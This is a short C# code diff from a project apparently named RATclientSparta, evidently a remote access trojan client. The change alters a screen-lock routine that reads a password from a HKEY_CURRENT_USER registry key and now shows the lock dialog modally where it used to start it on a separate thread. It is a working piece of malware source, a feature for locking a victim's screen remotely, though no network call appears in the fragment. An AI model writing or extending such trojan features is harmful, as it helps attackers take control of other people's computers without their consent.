@@ -18,11 +18,9 @@ namespace RATclientSparta.Tools.Screen
             {
                 RegistryGet get = new RegistryGet();
                 //Decoding the password
-                string password = Encoding.ASCII.GetString(get.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock"));
-                new Thread(new ThreadStart(() =>
-                {
-                    ScreenLock ScreenLock = new ScreenLock(password);
-                })).Start();
+                string password = get.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock");
+                ScreenLock ScreenLock = new ScreenLock(password);
+                ScreenLock.ShowDialog();
             }
         }
     }
